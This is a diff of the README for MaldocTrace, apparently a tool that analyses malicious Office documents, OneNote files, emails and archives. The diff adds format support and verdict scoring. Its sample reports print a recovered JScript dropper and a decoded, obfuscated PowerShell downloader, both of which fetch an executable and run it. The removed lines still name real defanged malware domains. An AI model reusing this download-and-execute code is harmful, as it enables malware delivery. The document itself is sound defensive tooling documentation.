@@ -27,6 +27,7 @@ Documents with no macros at all are covered too. Remote template injection, DDE 
   - embedded and linked OLE objects of `.doc` files (`ObjectPool`): class and ProgID, OLE Packages (label, original and temp path), URL and file monikers of linked objects (CVE-2017-0199 pattern) and Equation Editor exploits;
   - RTF embedded objects decoded the way Word reads them (obfuscated `\objdata`, corrupted OLE1 headers), with Equation Editor exploit detection: the MTEF FONT overflow (CVE-2017-11882 / CVE-2018-0802) and the MATRIX overflow (CVE-2018-0798), plus extraction of the bytes that follow;
   - hyperlinks on pictures and cells, and QR-code lures;
+  - embedded and linked OLE objects of `.xls` (`MBD` storages), `.doc` (`ObjectPool`) and OOXML (`embeddings/`) files: linked objects with URL monikers, OLE Packages, Equation Editor data, and the files they carry (PDF with its active-content markers and links, scripts, executables, archives). Embedded documents are analysed recursively and reported under `children` with their own verdict;
   - when nothing is found, the text report lists what was checked (also in the JSON `checks` field);
   - **VBA stomping**: string literals compiled into the p-code but missing from the source mean the source shown is not the code Office runs. Those literals are reported and scanned for indicators.
 - **Payload hiding places**: cell values (`Sheets("x").Range("A1")`, `Cells(r, c)`), document properties (`BuiltInDocumentProperties("Comments")`, custom properties), document variables (`ActiveDocument.Variables`, from `.docx` settings and the `StwUser` table of `.doc` files) and UserForm controls (`TextBox.Text`, `Label.Caption`) are all available to the emulated macro.
@@ -107,7 +108,31 @@ maldocTrace version
 | `--input-format vba` | Analyze a plain-text VBA file. |
 | `--timeout`, `--max-steps` | Per-file time budget and interpreter step budget. |
 
-Exit codes: `0` success (even when the sample is malicious), `1` analysis or internal error, `2` usage error.
+### Evasive Word formats
+
+Word also opens documents that are not `.doc` or `.docx` containers, and droppers use them because many scanners do not look inside: Word 2003 XML (`w:wordDocument`, with the VBA project as a base64 ActiveMime blob in `w:binData`), Flat OPC (`pkg:package`, every OOXML part inline) and MHT/MHTML web archives with an ActiveMime part. MaldocTrace decodes them in memory and analyses the VBA project, fields and templates they carry like any other document.
+
+### SYLK, IQY and CSV
+
+Excel opens text spreadsheets without the protections of a workbook. SYLK files (`.slk`) can be Excel 4.0 macro sheets with an `Auto_Open` name: their cells are rebuilt and emulated like an `.xls` macro sheet. IQY web queries make Excel fetch a URL (reported as a high-severity finding), and CSV cells with DDE formulas (`=cmd|' /c ...'!A0`) are reported as DDE.
+
+### OneNote
+
+OneNote sections (`.one`) are a common dropper since Office blocked internet macros: a lure picture sits over an embedded HTA, batch file, script, shortcut or executable. MaldocTrace extracts every embedded file, classifies it by content, reports scripts (with the commands and indicators in them) and executables, and analyses embedded documents as children.
+
+### Emails
+
+`.eml` and Outlook `.msg` files are analysed as containers: the report shows the sender, recipient, subject, date and attachment names, extracts URLs from the bodies as indicators, and analyses every attachment (documents, archives, scripts, attached messages) as a child report.
+
+### Archives
+
+Samples usually travel in password-protected archives. `analyze` opens ZIP (ZipCrypto and WinZip AES) and 7z archives in memory, trying `infected`, `malware`, `virus` and any `--password`, and analyses every member. Nothing is written to disk. Office documents, emails and nested archives inside get their own report under `children`; scripts and executables are listed with their hash and type. Bomb protection: at most 512 members, 64 MiB per member, 512 MiB in total and a bounded compression ratio.
+
+7z support uses [github.com/bodgit/sevenzip](https://github.com/bodgit/sevenzip) (BSD-3-Clause). It is the only third-party dependency besides `golang.org/x/text`, with its own decompressors (`klauspost/compress`, `ulikunitz/xz`, `andybalholm/brotli`, `pierrec/lz4`).
+
+Exit codes: `0` success (even when the sample is malicious), `1` analysis or internal error, `2` usage error, `3` the `--fail-on` threshold was met.
+
+Every report starts with a **verdict** (`malicious`, `suspicious`, `clean` or `unknown`), a risk score from 0 to 100 and the reasons that produced it. The score adds up the evidence: recovered commands, static findings by severity (a high-severity DDE field, remote template, linked object, Equation Editor exploit or `Auto_Open` macro sheet alone is malicious), decoded payloads, executable files, macros with auto-run entry points, network indicators, Excel's default encryption password, and the verdicts of embedded files. A partial analysis (timeout, limit hit, unknown password) that found nothing is `unknown`, never `clean`. The JSON field `checks` lists what was examined. For pipelines, `--fail-on suspicious` or `--fail-on malicious` turns the verdict into exit code `3`.
 
 ---
 
@@ -250,7 +275,7 @@ Operational: completed | Semantic coverage: supported_subset
       Category: script | Language: JScript | 555 bytes | sha256=cbf2ae49467472c81c8d7dc3492cae31073050a6ab41414a12a0e82c9f6ff7fa
       Defines: hexer
       Content:
-        function hexer () { var shell = new ActiveXObject ("WScript.Shell");var fso = new ActiveXObject ("Scripting.FileSystemObject");var tmp_path = fso.GetSpecialFolder( 2) + "\\\\" + fso.GetTempName();var stream = new ActiveXObject ("ADODB.Stream");stream.Open();stream.Type = 1;stream.Position = 0; var ass = new ActiveXObject("Microsoft.XMLHTTP");ass.open("GET", "hxxp://northsidecollisiona2[.]com/load5.exe", 0);ass.send();stream.Write(ass.ResponseBody);stream.SaveToFile(tmp_path);stream.Close();var cmdrun = "cmd.exe /c " + tmp_path; shell.run(cmdrun, 0); }
+        function hexer () { var shell = new ActiveXObject ("WScript.Shell");var fso = new ActiveXObject ("Scripting.FileSystemObject");var tmp_path = fso.GetSpecialFolder( 2) + "\\\\" + fso.GetTempName();var stream = new ActiveXObject ("ADODB.Stream");stream.Open();stream.Type = 1;stream.Position = 0; var ass = new ActiveXObject("Microsoft.XMLHTTP");ass.open("GET", "hxxp://host1.example[.]invalid/load5.exe", 0);ass.send();stream.Write(ass.ResponseBody);stream.SaveToFile(tmp_path);stream.Close();var cmdrun = "cmd.exe /c " + tmp_path; shell.run(cmdrun, 0); }
       Derived from: event-2
       Status: recovered
 
@@ -302,7 +327,7 @@ Operational: completed | Semantic coverage: partial
       Category: encoded_command | Language: PowerShell | 2514 bytes | sha256=5d577b5d9853ff67f14930be4c6c1069c498760cb0276d986d95f8d300773632
       Encoding: Base64 → UTF-16LE
       Content (normalized: powershell_string_concatenation; raw in JSON):
-        $Ogou_51=('Qt71tl5');.('new-item') $ENV:tEmp\OFFICE2019 -itemtype DiREctorY;[Net.ServicePointManager]::"S`eCUriTy`PrOT`OC`Ol" = ('tls12, tls11, tls');$Qakfo0q = ('Z0fv3kbg');$Brv35rs=('E6h4nkn');$Ec9w4e0=$env:temp+(('N3pOffice2019N3p')."re`Pl`AcE"('N3p',[sTriNg][CHaR]92))+$Qakfo0q+('.exe');$Z_jji3m=('Ogp57wj');$Y7jmxz8=&('new-object') NET.webcLIEnt;$Innewc_=('hxxp://52550750-56-20180826151453.webstarterz[.]com/savewayexpressthai.com/jnze_2o3j_k/*hxxp://oubaina[.]com/wp-includes/lqkz_nvr_1avf4/*hxxps://www.msbc[.]kz/data/k527_5_cbdvv5bi19/*hxxp://okcupidating[.]com/im/fsq_esj_qgx060p/*hxxp://bike-nomad[.]com/cgi-bin/7n_0x0_62mnzyh9q/')."sP`lIt"([char]42);$Fe8neg4=('Kymrw9w');foreach($Msuonh8 in $Innewc_){try{$Y7jmxz8."DoW`NLoAd`Fi`LE"($Msuonh8, $Ec9w4e0);$Ui3l49g=('Dohxbzg');If ((&('Get-Item') $Ec9w4e0)."lEng`Th" -ge 31451) {&('Invoke-Item')($Ec9w4e0);$Cwio_h5=('E6vp7vw');break;$Tay50lk=('Ph10gb1')}}catch{}}$U7tmnk4=('Yewcw8k')
+        $Ogou_51=('Qt71tl5');.('new-item') $ENV:tEmp\OFFICE2019 -itemtype DiREctorY;[Net.ServicePointManager]::"S`eCUriTy`PrOT`OC`Ol" = ('tls12, tls11, tls');$Qakfo0q = ('Z0fv3kbg');$Brv35rs=('E6h4nkn');$Ec9w4e0=$env:temp+(('N3pOffice2019N3p')."re`Pl`AcE"('N3p',[sTriNg][CHaR]92))+$Qakfo0q+('.exe');$Z_jji3m=('Ogp57wj');$Y7jmxz8=&('new-object') NET.webcLIEnt;$Innewc_=('hxxp://host2.example[.]invalid/a/*hxxp://host3.example[.]invalid/b/*hxxps://host4.example[.]invalid/c/*hxxp://host5.example[.]invalid/d/*hxxp://host6.example[.]invalid/e/')."sP`lIt"([char]42);$Fe8neg4=('Kymrw9w');foreach($Msuonh8 in $Innewc_){try{$Y7jmxz8."DoW`NLoAd`Fi`LE"($Msuonh8, $Ec9w4e0);$Ui3l49g=('Dohxbzg');If ((&('Get-Item') $Ec9w4e0)."lEng`Th" -ge 31451) {&('Invoke-Item')($Ec9w4e0);$Cwio_h5=('E6vp7vw');break;$Tay50lk=('Ph10gb1')}}catch{}}$U7tmnk4=('Yewcw8k')
       Derived from: command-1
       Status: decoded
 
